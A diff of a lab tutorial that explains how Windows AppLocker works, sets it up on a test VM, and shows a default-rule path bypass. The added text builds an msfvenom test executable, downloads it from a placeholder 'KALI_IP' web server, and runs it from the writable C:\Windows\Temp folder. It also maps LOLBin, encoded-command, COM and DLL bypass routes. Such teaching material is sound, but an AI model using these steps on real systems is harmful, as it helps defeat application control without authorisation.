@@ -1,38 +1,48 @@
-# AppLocker - How It Actually Works
-
-Before you break something, you need to understand it. Not just "AppLocker blocks programs" - that is the Wikipedia version. You need to know what is actually happening under the hood when AppLocker decides to allow or block something. Because the bypasses in the next files all come directly from how AppLocker works internally.
-
-So let's build that understanding, piece by piece. And while we do that, we'll set it up in your lab so you have something real to test against.
+# AppLocker - How It Works and Why It Exists
 
 ---
 
-## Let's Start With What AppLocker Actually Is
+## The Problem It Is Trying to Solve
 
-Most people think AppLocker is a single program sitting somewhere watching what you run. It is not. It is two separate pieces working together, and understanding what each one does changes how you think about bypassing it.
+Picture this scenario. An employee at a company gets a phishing email. The attachment looks like an invoice PDF. They download it and run it. It is not a PDF - it is an executable.
 
-**Piece 1: AppIDSvc (Application Identity Service)**
+What happens next on a standard Windows machine with no application control?
 
-This is a Windows service - a background process that runs constantly. Its one job is to figure out the "identity" of any file that tries to run. Who made it? Where did it come from? What is its cryptographic fingerprint? AppIDSvc answers these questions.
+The executable runs. It drops a tool like Mimikatz into memory, which dumps every password hash from the Windows authentication system (LSASS process). With those hashes, the attacker can authenticate as any user on the domain - including administrators. The entire network is now compromised from one click.
 
-Think of it like the TSA database system at an airport. When you scan your boarding pass, the system looks you up and returns an answer - cleared or flagged. AppIDSvc is that database lookup system.
+The question is: at what point could this have been stopped?
 
-**Piece 2: appid.sys (a kernel-mode driver)**
+- The phishing email got through - email filtering failed.
+- The user ran the file - user training failed.
+- The executable ran - this is where application control kicks in.
 
-The kernel is the lowest layer of Windows - the part that talks directly to hardware and controls every running process. `appid.sys` lives here.
+AppLocker is that last line. Its job is to make sure that even if a malicious file lands on a machine, it cannot execute. If the file is not on the approved list, it does not run. Period.
 
-When any executable tries to start, `appid.sys` intercepts it before it runs a single instruction, asks AppIDSvc for a decision, and either lets it through or kills it right there. The key word is "before." The program does not start and then get stopped. It never starts at all.
-
-This is different from antivirus, which often scans files while they run. AppLocker is a gate, not a checkpoint inside the road.
+That is the threat model. Keep it in mind as you learn the mechanics, because every design decision AppLocker makes - and every gap in it - makes more sense when you understand what it is defending against.
 
 ---
 
-Let's verify AppIDSvc is actually there on your machine. Open PowerShell and run:
+## What AppLocker Actually Is
+
+AppLocker is not a single process sitting somewhere watching what you run. It is two separate components working at different levels of the operating system.
+
+**AppIDSvc - Application Identity Service**
+
+This is a user-space Windows service running in the background. Its job is to determine the identity of a file that is about to execute - its digital signature, its path, its cryptographic hash. It is the policy decision engine: given what we know about this file, is it allowed?
+
+**appid.sys - Kernel Driver**
+
+The kernel is the deepest layer of Windows. It controls hardware, manages memory, and supervises every running process. `appid.sys` operates here.
+
+When any executable attempts to start, `appid.sys` intercepts the call at the kernel level before a single instruction of that program runs. It queries AppIDSvc for a decision and either allows execution or terminates the attempt right there. The program does not start and then get killed. It never starts at all.
+
+This is architecturally different from antivirus, which often scans files as they run. AppLocker is a gate before execution. Antivirus is often a check during execution.
+
+Verify the service on your Windows 11 VM now. Open PowerShell:
 
 ```powershell
 Get-Service AppIDSvc
 ```
-
-You will see:
 
 ```
 Status   Name               DisplayName
@@ -40,76 +50,51 @@ Status   Name               DisplayName
 Stopped  AppIDSvc           Application Identity
 ```
 
-It is stopped. That is normal on a fresh Windows install. AppLocker does not enforce anything until this service is running. This matters: **if AppIDSvc is stopped, AppLocker is completely disabled**. Keep that in mind.
+It is stopped on a fresh install. This is important: **if AppIDSvc is stopped, AppLocker enforces nothing**. A running service is a prerequisite for any of this to work.
 
 ---
 
-## What AppLocker Can Actually Control
+## What AppLocker Can and Cannot Watch
 
-AppLocker does not watch everything. It watches specific file types, organized into five groups called "rule collections." Each collection is independent - you can enable some and leave others off.
+AppLocker controls five categories of files, called rule collections. Each is configured independently.
 
-| Collection | Files It Watches |
-|------------|-----------------|
+| Collection | File Types It Covers |
+|------------|---------------------|
 | Executable Rules | `.exe`, `.com` |
 | Script Rules | `.ps1`, `.bat`, `.cmd`, `.vbs`, `.js` |
 | Windows Installer Rules | `.msi`, `.msp`, `.mst` |
-| Packaged App Rules | `.appx` (Store apps) |
+| Packaged App Rules | `.appx` (Windows Store apps) |
 | DLL Rules | `.dll`, `.ocx` |
 
-Here is the thing that should immediately catch your attention: **DLL rules are off by default**. Not just unconfigured - Microsoft specifically leaves them disabled because enabling them tanks system performance. Every program that runs loads tens or hundreds of DLLs. Checking each one against AppLocker rules is expensive.
+The one that should stand out immediately: **DLL rules are disabled by default on every Windows installation**.
 
-The result? On virtually every AppLocker deployment you will ever encounter, DLL loading is completely unmonitored. Drop a malicious DLL anywhere, load it through a trusted program, and AppLocker never sees it. That entire attack surface is wide open by default. We exploit this in File 06.
+The reason is performance. Every program that starts loads anywhere from a dozen to hundreds of DLLs. If AppLocker checked every DLL load against its policy, the overhead would be significant and noticeable. Microsoft decided the trade-off was not worth it and left DLL rules off.
 
----
-
-## The Two Modes: Audit and Enforce
-
-Each rule collection has two modes:
-
-**Audit Only:** AppLocker evaluates files against the rules but does not block anything. It just writes to the Windows Event Log saying "this would have been blocked." Companies use this phase to figure out which rules they need before they start blocking things.
-
-**Enforce Rules:** AppLocker actively blocks files that do not have a matching allow rule.
-
-Why does this matter for you? If you land on a machine and AppLocker is running in Audit mode, it looks like it is protecting the system - but it is not blocking a thing. Checking the mode is one of the first things you do.
-
-Let's check right now on your VM. Run this in PowerShell:
-
-```powershell
-Get-AppLockerPolicy -Effective -Xml
-```
-
-On a fresh machine with no AppLocker configured, you will get:
-
-```xml
-<AppLockerPolicy Version="1">
-</AppLockerPolicy>
-```
-
-Empty. No rules, no enforcement mode, nothing. AppLocker exists as a feature on this machine but it is doing absolutely nothing right now. That is the state we are about to change.
+The consequence: on virtually every AppLocker deployment you encounter in the real world, DLL loading is completely unmonitored. A malicious DLL can be loaded by any allowed program and AppLocker will never see it. This is a structural blind spot, not a misconfiguration.
 
 ---
 
-## How AppLocker Decides: The Three Rule Types
+## How AppLocker Makes Decisions
 
-When AppLocker does have rules, it uses three different ways to identify a file. Understanding each one tells you exactly where the gaps are.
+AppLocker uses three rule types to identify files. Each has a different attack surface.
 
-### Publisher Rules (Trusting the Signature)
+### Publisher Rules
 
-Every legitimate program from a real company is digitally signed. The signature is a cryptographic stamp that says "I am Microsoft" or "I am Adobe" and cannot be faked without the private key.
+Every legitimate program from a software vendor is digitally signed using a code signing certificate. The signature cryptographically proves who made the file.
 
-AppLocker can read that stamp and make decisions based on it. A publisher rule looks like: "Allow any file signed by Microsoft Corporation." That one rule covers thousands of Windows programs - Notepad, PowerShell, Windows Defender, everything Microsoft ships.
+Publisher rules say: allow or deny based on the signature. A rule might say "allow anything signed by Microsoft Corporation." That single rule covers thousands of Windows binaries - without needing to list them one by one.
 
-You can narrow it down further: allow only a specific product, or only a specific version range. This flexibility is why publisher rules are the most commonly used type.
+The attack surface: publisher rules trust the signature, not the behavior. `mshta.exe` is signed by Microsoft. A publisher rule allowing Microsoft-signed files will allow `mshta.exe` to run - regardless of what malicious script you feed into it. The signature is legitimate. What the program does after starting is outside AppLocker's scope.
 
-**The attack angle:** Publisher rules trust the stamp, not what the program does. If `mshta.exe` is signed by Microsoft and you write a rule that allows everything signed by Microsoft, AppLocker will happily let `mshta.exe` run - even if you use it to execute malicious code. The signature is valid. AppLocker does not care what the program does after it starts.
+This is why LOLBins work. LOLBins (Living Off the Land Binaries) are legitimate, validly-signed Windows tools that can be abused. They pass every publisher rule check because they are genuinely from Microsoft.
 
-### Path Rules (Trusting the Location)
+### Path Rules
 
-Path rules allow or block based on where a file is stored. "Allow everything in `C:\Windows\`" or "Allow everything in `C:\Program Files\`."
+Path rules allow or deny based on file location. The most common default: allow everything in `C:\Windows\` and everything in `C:\Program Files\`.
 
-This is the simplest rule type to understand and the weakest to rely on. The rule trusts the location, not the file. It does not check who created the file or when. If an attacker writes a malicious executable into an allowed folder, AppLocker allows it without question.
+The attack surface: path rules trust location, not content. They do not check who wrote the file there or when. If a regular user can write an executable into a folder inside `C:\Windows\`, AppLocker's path rule covers it and it will run.
 
-**The attack angle:** Several folders inside `C:\Windows\` are writable by regular users because Windows needs them to be writable for legitimate reasons:
+Several folders inside `C:\Windows\` are writable by standard users because Windows needs them to be:
 
 ```
 C:\Windows\Temp
@@ -119,59 +104,76 @@ C:\Windows\System32\spool\drivers\color
 C:\Windows\System32\Tasks
 ```
 
-A path rule saying "allow everything in C:\Windows\" covers all of these. A regular user can drop anything into `C:\Windows\Temp\` and AppLocker's default rules will allow it to run.
+A path rule saying "trust everything in C:\Windows\" applies to every one of these. Writing a malicious executable to `C:\Windows\Temp\` and executing it bypasses AppLocker's default path-based rules entirely.
 
-### Hash Rules (Trusting the Exact File)
+### Hash Rules
 
-A file hash is a mathematical fingerprint calculated from every byte in a file. Change one byte and the hash changes completely. Hash rules say: "Allow the exact file whose SHA-256 hash is `a1b2c3...`."
+A file hash is a SHA-256 fingerprint calculated from every byte in the file. Hash rules say: allow this exact file and only this exact file.
 
-This is the most precise type. Only that specific file, untampered, is allowed.
-
-**The practical problem:** Every time a program updates, its bytes change, which means its hash changes. A hash rule for Chrome, for example, would break every time Chrome updates. Maintaining hash rules for real software is a constant maintenance burden. In practice, hash rules are used for custom internal tools that never change.
+The practical problem: every software update changes the file bytes, which changes the hash. A hash rule for any actively updated software breaks constantly. Hash rules are rarely used at scale - they appear mostly for custom internal tools that never change.
 
 ---
 
-## Setting Up AppLocker in Your Lab
+## Enforce vs Audit: The Critical Distinction
 
-Enough reading. Let's set it up so you have something to actually test against.
+Each rule collection operates in one of two modes:
 
-Everything below is done on your **Windows 11 Enterprise VM**, logged in as Administrator.
+**Enforce Rules** - AppLocker actively blocks files that match deny rules or match no allow rule. This is real protection.
 
-### First: Start the AppLocker Service
+**Audit Only** - AppLocker evaluates files against rules but blocks nothing. It writes to the Event Log: "this would have been blocked." Companies use this to understand what their rules would catch before they flip to enforcement.
 
-Open Command Prompt as Administrator and run these two commands:
+This distinction matters in practice. An AppLocker deployment in Audit mode looks identical to an enforcement deployment from the outside. Checking the mode is one of the first reconnaissance steps on an unknown machine. If it is in Audit mode, application control is theater - nothing is actually being blocked.
+
+Check current state on your VM:
+
+```powershell
+Get-AppLockerPolicy -Effective -Xml
+```
+
+On a freshly installed machine with no AppLocker configuration:
+
+```xml
+<AppLockerPolicy Version="1">
+</AppLockerPolicy>
+```
+
+Empty. No rules, no enforcement. AppLocker exists as a feature but is doing nothing. This is what you will change now.
+
+---
+
+## Setting Up AppLocker
+
+Everything from here runs on your **Windows 11 Enterprise VM** as Administrator.
+
+### Step 1 - Start the AppLocker Service
+
+Open Command Prompt as Administrator:
 
 ```cmd
 sc config AppIDSvc start= auto
 sc start AppIDSvc
 ```
 
-The first command tells Windows to automatically start this service at boot. The second starts it right now.
+`sc config` sets the service to start automatically at boot. `sc start` starts it immediately.
 
-Verify it is running:
+Verify:
 
 ```cmd
 sc query AppIDSvc
 ```
-
-You are looking for this:
 
 ```
 SERVICE_NAME: AppIDSvc
         STATE              : 4  RUNNING
 ```
 
-`STATE 4 RUNNING` - good. If it shows `STOPPED`, reboot the VM and run `sc start AppIDSvc` again.
+`STATE 4 RUNNING` - confirmed. If it shows `STOPPED`, reboot and retry.
 
----
+### Step 2 - Open Group Policy Editor
 
-### Second: Open the Group Policy Editor
+Press `Win + R`, type `gpedit.msc`, press Enter.
 
-Press `Win + R`, type `gpedit.msc`, hit Enter.
-
-Group Policy Editor is the central configuration tool for Windows security settings. AppLocker lives here. On a real corporate network, these settings would be pushed from a domain controller to every machine. In your lab, you are configuring the local machine directly.
-
-In the left panel, navigate here:
+Navigate in the left panel:
 
 ```
 Computer Configuration
@@ -181,54 +183,38 @@ Computer Configuration
                     └── AppLocker
 ```
 
-Click on AppLocker. You will see the five rule collections in the right panel.
+Click **AppLocker**. You will see the five rule collections listed.
 
----
+### Step 3 - Understand Why Default Rules Come First
 
-### Third: Create Default Rules
+If you enable AppLocker enforcement with zero rules, the default behavior is deny-all. Nothing runs - not Explorer, not Task Manager, not the command prompt. The machine locks itself.
 
-Here is something important to understand before you enable enforcement: if you turn on AppLocker enforcement with zero rules, nothing runs. Not Notepad, not PowerShell, not Windows Explorer. The machine becomes unusable.
+Default rules prevent this by automatically allowing the system to function:
+- All files in `C:\Windows\` are allowed
+- All files in `C:\Program Files\` are allowed
+- Administrators can run anything regardless
 
-Default rules are the safety net. They automatically allow:
-- Everything in `C:\Windows\` (all Windows system files)
-- Everything in `C:\Program Files\` (all installed software)
-- Everything for the local Administrators group (admins can always run anything)
+Right-click **Executable Rules** > **Create Default Rules**. Three rules appear.
 
-These three rules mean normal Windows use keeps working after you enable enforcement.
+Do the same for **Script Rules** > **Create Default Rules**.
 
-Right-click on **Executable Rules** and select **Create Default Rules**. Watch three rules appear:
+Leave the other collections unconfigured.
 
-```
-(Default Rule) All files located in the Windows folder
-(Default Rule) All files located in the Program Files folder
-(Default Rule) All files  [this one is for Administrators only]
-```
+### Step 4 - Enable Enforcement
 
-Now do the same for **Script Rules**: right-click > **Create Default Rules**.
+Right-click **AppLocker** > **Properties**.
 
-Leave DLL Rules, Windows Installer Rules, and Packaged App Rules alone.
+Under the **Executable Rules** tab, change the dropdown from `Not configured` to `Enforce rules`.
 
----
-
-### Fourth: Enable Enforcement
-
-Right-click on **AppLocker** (the parent item, not the sub-items) and select **Properties**.
-
-You will see tabs for each collection. Under **Executable Rules**, change the dropdown from `Not configured` to `Enforce rules`. Do the same for **Script Rules**.
+Under the **Script Rules** tab, do the same.
 
 Click OK.
 
----
-
-### Fifth: Apply It
-
-Back in Command Prompt (as Administrator):
+### Step 5 - Apply the Policy
 
 ```cmd
 gpupdate /force
 ```
-
-You will see:
 
 ```
 Updating policy...
@@ -236,209 +222,205 @@ Computer Policy update has completed successfully.
 User Policy update has completed successfully.
 ```
 
-AppLocker is now active and enforcing. Let's make sure.
-
-Run this in PowerShell:
+AppLocker is now enforcing. Verify:
 
 ```powershell
 Get-AppLockerPolicy -Effective -Xml
 ```
 
-This time, instead of the empty XML from before, you will see rules. Look for `RuleCollection Type="Exe" EnforcementMode="Enabled"` and `RuleCollection Type="Script" EnforcementMode="Enabled"`. Those words `EnforcementMode="Enabled"` confirm rules are being enforced, not just logged.
+This time you will see actual rules in the output. Find the line `EnforcementMode="Enabled"` under the Exe and Script collections. That confirms enforcement is active, not just configured.
 
 ---
 
-## Testing That AppLocker Is Actually Blocking Things
+## Testing AppLocker With a Real Payload
 
-Knowing AppLocker is configured is different from knowing it works. Let's test it.
+Reading about AppLocker is one thing. Watching it block something real is how it actually clicks.
 
-### Test 1: Block Something
+You are going to generate a test executable on Kali, transfer it to your Windows VM, and attempt to run it. AppLocker will block it. Then you will run it from a location that AppLocker trusts - and it will run. That gap is the foundation of every bypass in the files that follow.
 
-Create a simple batch file in a location that is NOT in an allowed path:
+### On Your Kali VM
 
-```cmd
-echo echo This script ran > C:\Users\Public\test.bat
+Open a terminal and generate a test Windows executable using msfvenom:
+
+```bash
+msfvenom -p windows/x64/exec CMD=calc.exe -f exe -o test_payload.exe
 ```
 
-Now try to run it:
+This generates a Windows executable that launches Calculator when run. It is not destructive and has no network component - just a clean test to prove execution happened.
 
-```cmd
-C:\Users\Public\test.bat
+Now serve it over HTTP so Windows can download it:
+
+```bash
+python3 -m http.server 8000
+```
+
+Leave this running. Your Kali machine is now hosting the file on port 8000.
+
+### On Your Windows 11 VM
+
+Open PowerShell and download the file. Replace `KALI_IP` with your Kali machine's IP address (the one you noted during lab setup):
+
+```powershell
+Invoke-WebRequest -Uri "http://KALI_IP:8000/test_payload.exe" -OutFile "C:\test_payload.exe"
+```
+
+Confirm the download:
+
+```powershell
+Get-Item C:\test_payload.exe
+```
+
+```
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------  ----
+-a----        19/06/2026    10:45          73802  test_payload.exe
+```
+
+Now attempt to run it:
+
+```powershell
+C:\test_payload.exe
 ```
 
 What you will see:
 
 ```
-Access is denied.
+C:\test_payload.exe : This program is blocked by group policy.
+For more information, contact your system administrator.
+    + CategoryInfo          : NotSpecified: (:) [], Win32Exception
+    + FullyQualifiedErrorId : System.ComponentModel.Win32Exception
 ```
 
-Or depending on context, nothing happens at all - the file just does not execute. Either way, AppLocker blocked it.
+Or, when run from Command Prompt:
 
-Now check the Event Log to confirm. Open Event Viewer:
-- Press `Win + R`, type `eventvwr.msc`, Enter
+```
+This program is blocked by group policy. For more information, contact your system administrator.
+```
+
+Calculator does not open. AppLocker blocked it.
+
+### Check the Event Log
+
+Open Event Viewer (`Win + R` > `eventvwr.msc`).
 
 Navigate to:
+
 ```
 Applications and Services Logs
   └── Microsoft
         └── Windows
               └── AppLocker
-                    └── MSI and Script
+                    └── EXE and DLL
 ```
 
-You should see an entry with Event ID **8007**. Double-click it. The description will tell you the exact file that was blocked, the user who tried to run it, and the rule that caused the block (in this case, no matching rule).
+You will see an event. Double-click it. The details will show:
 
-That is AppLocker doing its job.
+- **Event ID 8004** - the file was blocked
+- The full path of the blocked file (`C:\test_payload.exe`)
+- The user who attempted to run it
+- The policy that caused the block (no matching allow rule)
+
+This is exactly what a defender sees when AppLocker blocks a real attack. The event tells you what was attempted, by whom, and when.
 
 ---
 
-### Test 2: Confirm Allowed Paths Work
+## Finding the Gap: Running From a Trusted Path
 
-Copy that same file to a location inside `C:\Windows\`:
-
-```cmd
-copy C:\Users\Public\test.bat C:\Windows\Temp\test.bat
-```
-
-Run it:
-
-```cmd
-C:\Windows\Temp\test.bat
-```
-
-What you will see:
-
-```
-This script ran
-```
-
-It ran. Because `C:\Windows\Temp\` is inside `C:\Windows\`, and the default rule allows everything in `C:\Windows\`.
-
-Here is the thing - `C:\Windows\Temp\` is writable by regular users. Any user on this machine can put a file there. And AppLocker just told you it will run anything from there.
-
-That right there is your first bypass hint. It is not a bug. It is the default configuration working exactly as designed. The design just has a gap.
-
----
-
-### Test 3: Prove Execution Policy Bypass Does NOT Bypass AppLocker
-
-Remember the `-ExecutionPolicy Bypass` flag from File 02? Let's see what happens when AppLocker is involved.
-
-Take the `C:\test.ps1` script you created in File 02. Try running it with the bypass flag:
+AppLocker blocked the executable from `C:\`. Now copy it to a location inside the trusted `C:\Windows\` path:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -File C:\test.ps1
+Copy-Item C:\test_payload.exe C:\Windows\Temp\test_payload.exe
 ```
 
-What you will see - not an execution policy error, but an AppLocker error:
+Run it from there:
 
-```
-C:\test.ps1 cannot be loaded. The file C:\test.ps1 is not digitally signed.
-You cannot run this script on the current system.
-    + CategoryInfo    : SecurityError
+```powershell
+C:\Windows\Temp\test_payload.exe
 ```
 
-Or sometimes:
+Calculator opens.
 
-```
-Access to the path 'C:\test.ps1' is denied.
-```
+AppLocker allowed it because `C:\Windows\Temp\` is inside `C:\Windows\`, which the default path rule trusts unconditionally. The file content did not change. The signature did not change. Only the location changed - and that is enough.
 
-Either way: blocked. The `-ExecutionPolicy Bypass` flag bypasses PowerShell's execution policy. It does absolutely nothing to AppLocker. They are completely separate systems.
+This is not a bug. This is the default path rule behaving exactly as written. The rule trusts the folder. The folder is writable by users. The gap follows directly from the design.
 
-This is a crucial thing to internalize: **bypassing one layer does not bypass the other**. Execution policy and AppLocker both need to be handled, independently. The later files show you how.
+Now check the Event Log again. You will see no 8004 event this time - because nothing was blocked. AppLocker allowed the execution silently.
 
 ---
 
-## Reading the Rules Like an Attacker
+## Reading the Policy as an Attacker Would
 
-When a penetration tester lands on a machine, one of the first things they do is read the AppLocker policy. Not to admire it - to find the gaps.
-
-Run this in PowerShell:
+When a penetration tester reaches a machine protected by AppLocker, this is one of the first commands they run:
 
 ```powershell
 $policy = Get-AppLockerPolicy -Effective -Xml
 [xml]$xml = $policy
 $xml.AppLockerPolicy.RuleCollection | ForEach-Object {
-    $collection = $_
-    Write-Host "`n=== $($collection.Type) ($($collection.EnforcementMode)) ===" -ForegroundColor Cyan
-    $collection.FilePathRule | ForEach-Object {
-        Write-Host "  ALLOW (path): $($_.Conditions.FilePathCondition.Path)"
+    $col = $_
+    Write-Host "`n[$($col.Type) - $($col.EnforcementMode)]" -ForegroundColor Yellow
+    $col.FilePathRule | ForEach-Object {
+        Write-Host "  Path allowed: $($_.Conditions.FilePathCondition.Path)"
     }
-    $collection.FilePublisherRule | ForEach-Object {
-        Write-Host "  ALLOW (publisher): $($_.Conditions.FilePublisherCondition.PublisherName)"
+    $col.FilePublisherRule | ForEach-Object {
+        Write-Host "  Publisher allowed: $($_.Conditions.FilePublisherCondition.PublisherName)"
     }
 }
 ```
 
-What you will see:
+Output on your lab machine:
 
 ```
-=== Exe (Enabled) ===
-  ALLOW (path): %PROGRAMFILES%\*
-  ALLOW (path): %WINDIR%\*
+[Exe - Enabled]
+  Path allowed: %PROGRAMFILES%\*
+  Path allowed: %WINDIR%\*
 
-=== Script (Enabled) ===
-  ALLOW (path): %PROGRAMFILES%\*
-  ALLOW (path): %WINDIR%\*
+[Script - Enabled]
+  Path allowed: %PROGRAMFILES%\*
+  Path allowed: %WINDIR%\*
 
-=== Msi (NotConfigured) ===
-
-=== Dll (NotConfigured) ===
-
-=== Appx (NotConfigured) ===
+[Msi - NotConfigured]
+[Dll - NotConfigured]
+[Appx - NotConfigured]
 ```
 
-Read that output and think like an attacker:
+What a penetration tester extracts from this in under a minute:
 
-- `%WINDIR%\*` means everything in `C:\Windows\` is allowed. Where in `C:\Windows\` can a regular user write files? That is your path bypass.
-- `%PROGRAMFILES%\*` means `C:\Program Files\`. Users cannot write there by default - not useful.
-- `Msi: NotConfigured` means installer rules are not enforced.
-- `Dll: NotConfigured` means DLL rules are not enforced. That entire attack surface is open.
-- `Exe (Enabled)` - executables are enforced.
-- `Script (Enabled)` - scripts are enforced.
+- `Dll: NotConfigured` - DLL loading is unmonitored. Load anything as a DLL.
+- `Msi: NotConfigured` - Installer files are unmonitored.
+- `%WINDIR%\*` - Everything in `C:\Windows\` is trusted. Which subfolders are writable by users? Those are execution points.
+- `Exe: Enabled` and `Script: Enabled` - These collections enforce. Executables and scripts from outside trusted paths will be blocked.
+- No publisher rules present - the configuration is entirely path-based, which is weaker.
 
-With this single command output, you already know: run executables from `C:\Windows\Temp\`, use LOLBins already in `C:\Windows\System32\`, load DLLs freely, use installer files freely. That is most of the bypass surface right there.
-
----
-
-## What AppLocker Simply Cannot Do
-
-Before we move to the actual bypasses, you need to understand AppLocker's hard limits - the things it cannot control no matter how well it is configured.
-
-**It cannot see inside allowed programs.** Once an allowed program starts running, AppLocker is done with it. What that program does next - what it downloads, what it executes, what it reads - AppLocker has no visibility. `mshta.exe` is allowed. You pass it a script. AppLocker sees `mshta.exe`, gives the thumbs up, and exits the picture. Whatever `mshta.exe` does with your script happens outside AppLocker's view.
-
-**It cannot control COM objects.** COM is a Windows system that lets programs communicate and share functionality. Certain COM objects can execute commands. When a script creates a COM object to run code, there is no file being executed - just two programs talking. AppLocker has no hook into this.
-
-**It cannot check DLLs (when DLL rules are off).** Which, as established, they almost always are. Any DLL loaded by any allowed program is completely invisible.
-
-**It cannot evaluate in-memory code.** Code that lives only in RAM - never written to a file - has nothing for AppLocker to evaluate. AppLocker is file-based. No file, no check.
-
-**It cannot check command-line arguments.** If PowerShell is allowed and you run `powershell -Command "malicious code here"`, AppLocker sees PowerShell start (allowed), and exits. The string of code you passed is not a file. AppLocker does not touch it.
+One command. The entire attack surface mapped.
 
 ---
 
-Each one of those limitations is a bypass technique. The LOLBins file exploits the first one. The COM file exploits the second. DLL hijacking exploits the third. PowerShell encoding exploits the last two.
+## What AppLocker Cannot Do - The Permanent Gaps
 
-That is why you needed to understand how AppLocker works before learning how to bypass it. Every bypass is a direct consequence of a real design decision. Nothing here is magic - it is just knowing the system well enough to walk around it.
+Some of AppLocker's limitations are configuration issues that can be fixed with better rules. The ones below are structural - they exist regardless of how AppLocker is configured.
+
+**It has no visibility into what allowed programs do.** The moment an allowed program starts running, AppLocker is finished with it. `mshta.exe` is allowed. Pass it a malicious VBScript payload. AppLocker sees `mshta.exe` start, approves it, and exits the picture. What `mshta.exe` does with your script is never inspected.
+
+**It cannot control COM object instantiation.** COM is the Windows subsystem that lets programs create and use objects from other programs. Certain COM objects can run arbitrary commands. When a script creates a COM object to execute code, there is no file being "executed" in the traditional sense - just inter-process communication. AppLocker has no hook into this.
+
+**It cannot evaluate code that is never written to disk.** AppLocker is file-based. If code is downloaded into memory and executed directly without ever becoming a file on disk, there is nothing for AppLocker to evaluate.
+
+**It cannot parse command-line arguments.** `powershell.exe` is allowed. Passing it `-Command "malicious code"` or `-EncodedCommand [base64]` is not running a script file - it is starting an allowed program with arguments. AppLocker checks the program. It does not parse what you pass into it.
 
 ---
 
-## Quick Reference
+Each of those four gaps maps directly to an attack technique:
 
-| Thing | What to Know |
-|-------|-------------|
-| AppIDSvc | The service that does policy lookups. If it is stopped, AppLocker is dead. |
-| appid.sys | Kernel driver that enforces decisions. Blocks before execution starts. |
-| DLL rules | Off by default on every real deployment. Huge blind spot. |
-| Audit mode | Logs but does not block. Looks like protection, is not. |
-| Enforce mode | Actually blocks. What you just set up. |
-| Default rules | Trust `C:\Windows\` and `C:\Program Files\`. Many writable subfolders inside. |
-| Publisher rules | Trust by signature. LOLBins exploit this - they are validly signed. |
-| Path rules | Trust by location. Writable subfolders inside trusted paths break this. |
-| Hash rules | Most precise, breaks on updates, rarely used at scale. |
-| Event ID 8004 | An executable was blocked. |
-| Event ID 8007 | A script was blocked. |
+| Gap | Technique | Covered In |
+|-----|-----------|-----------|
+| Allowed programs doing malicious things | LOLBins | File 04 |
+| PowerShell command-line arguments | Encoded commands, bypass flags | File 05 |
+| COM object instantiation | COM abuse | File 07 |
+| DLL loading unmonitored | DLL hijacking | File 06 |
+
+You now understand AppLocker well enough to bypass it. The next file starts with the most commonly used technique: LOLBins.
 
 ---
 
